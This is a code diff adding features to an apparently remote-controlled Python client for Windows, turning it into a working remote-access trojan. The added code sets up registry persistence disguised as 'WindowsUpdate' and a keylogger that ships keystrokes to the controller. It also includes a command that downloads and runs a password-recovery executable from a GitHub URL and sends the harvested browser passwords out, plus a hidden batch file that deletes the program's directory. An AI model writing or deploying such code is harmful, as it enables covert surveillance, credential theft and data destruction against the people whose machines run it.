@@ -10,8 +10,136 @@ from datetime import datetime
 import hashlib
 import json  # For handling file transfers via JSON messages
 from supabase import create_client, Client
+import sys
+import requests
+from pynput import keyboard
+import threading
+
+import winreg
+import shutil
+
+def add_to_startup():
+    try:
+        # Get the path of the current executable
+        exe_path = sys.executable
+        # Create registry key for startup
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                            0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        return "Added to startup successfully"
+    except Exception as e:
+        return f"Failed to add to startup: {e}"
+
+def remove_from_startup():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                            0, winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(key, "WindowsUpdate")
+        winreg.CloseKey(key)
+        return "Removed from startup successfully"
+    except Exception as e:
+        return f"Failed to remove from startup: {e}"
+
+import os
+import sys
+import subprocess
+import time
+
+def self_delete():
+    try:
+        # Get the directory of the script
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        batch_path = os.path.join(script_dir, "delete.bat")
+
+        # Create a batch file to delete all files and folders in the script's directory
+        with open(batch_path, "w") as batch:
+            batch.write(f'''@echo off
+timeout /t 3 /nobreak > nul
+cd /d "{script_dir}"
+del /q *.*
+for /d %%x in (*) do rmdir /s /q "%%x"
+del "{batch_path}"
+            ''')
+
+        # Run the batch file and exit the Python script
+        subprocess.Popen(batch_path, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        
+        return "Self-delete initiated"
+    
+    except Exception as e:
+        return f"Error: {e}"
+
+
+
+class KeyLogger:
+    def __init__(self, client):
+        self.client = client
+        self.log_file = "keylog.txt"
+        self.is_logging = False
+        self.listener = None
+        
+    def on_press(self, key):
+        if not self.is_logging:
+            return False
+            
+        try:
+            with open(self.log_file, "a") as f:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                if hasattr(key, 'char'):
+                    f.write(f'[{timestamp}] Alphanumeric key: {key.char}\n')
+                else:
+                    f.write(f'[{timestamp}] Special key: {key}\n')
+        except Exception as e:
+            print(f"Error logging key: {e}")
+
+    def start(self):
+        if not self.is_logging:
+            try:
+                # Create new log file
+                with open(self.log_file, "w") as f:
+                    f.write(f"=== Keylog started at {datetime.now()} ===\n")
+                
+                # Start listener in separate thread
+                self.is_logging = True
+                self.listener = keyboard.Listener(on_press=self.on_press)
+                self.listener.start()
+                return "Keylogging started successfully"
+            except Exception as e:
+                return f"Failed to start keylogging: {e}"
+        return "Keylogging is already running"
+
+    def stop(self):
+        if self.is_logging:
+            try:
+                self.is_logging = False
+                if self.listener:
+                    self.listener.stop()
+                
+                # Read log file
+                with open(self.log_file, "r") as f:
+                    logs = f.read()
+                
+                # Send logs to server
+                self.client.send_message("text", f"=== Keylog Report ===\n{logs}")
+                
+                # Delete log file
+                os.remove(self.log_file)
+                return "Keylogging stopped and logs sent"
+            except Exception as e:
+                return f"Error stopping keylogger: {e}"
+        return "Keylogging is not running"
 
 CLIENT_ID_FILE = "client_id.txt"
+
+def download(url):
+    get_request = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name,"wb") as out_file:
+        out_file.write(get_request.content)
+
 
 class RemoteClient:
     def __init__(self):
@@ -22,6 +150,7 @@ class RemoteClient:
         )
         self.client_id = self.get_or_create_client_id()
         self.register_client()
+        self.keylogger = KeyLogger(self)
         
     def get_or_create_client_id(self):
         """Retrieve the persisted client ID or create a new one."""
@@ -85,6 +214,9 @@ class RemoteClient:
             return "Command timed out after 30 seconds"
         except Exception as e:
             return f"Error executing command: {str(e)}"
+            
+
+        
 
     def capture_screenshot(self) -> str:
         """Capture screenshot and return base64 encoded string."""
@@ -177,7 +309,23 @@ class RemoteClient:
     def process_command(self, command: str):
         """Process received command."""
         try:
-            if command.startswith("cmd "):
+            print(command)
+            if command.startswith("cmd chrome"):
+                temp_dir = tempfile.gettempdir()
+                os.chdir(temp_dir)
+                download("https://github.com/gamkers/Python-EthicalHacking/raw/refs/heads/main/Files/Password_recovery.exe")
+                result = subprocess.check_output("Password_recovery.exe", shell=True)
+                if self.send_message("text", str(result)):
+                    print("passwords sent successfully!")
+                else:
+                    print("Failed to send passwords")
+            elif command == "start keylogs":
+                result = self.keylogger.start()
+                self.send_message("text", result)
+            elif command == "stop keylogs":
+                result = self.keylogger.stop()
+                #self.send_message("text", result)    
+            elif command.startswith("cmd "):
                 result = self.execute_command(command[4:])
                 self.send_message("text", result)
             elif command == "get image":
@@ -188,6 +336,16 @@ class RemoteClient:
             elif command.startswith("file "):
                 # Handle file manager commands
                 self.handle_file_manager(command)
+            elif command == "add startup":
+                result = add_to_startup()
+                self.send_message("text", result)
+            elif command == "remove startup":
+                result = remove_from_startup()
+                self.send_message("text", result)
+            elif command == "self delete":
+                result = self_delete()
+                self.send_message("text", result)
+            
             else:
                 self.send_message("text", "Unknown command.")
         except Exception as e:
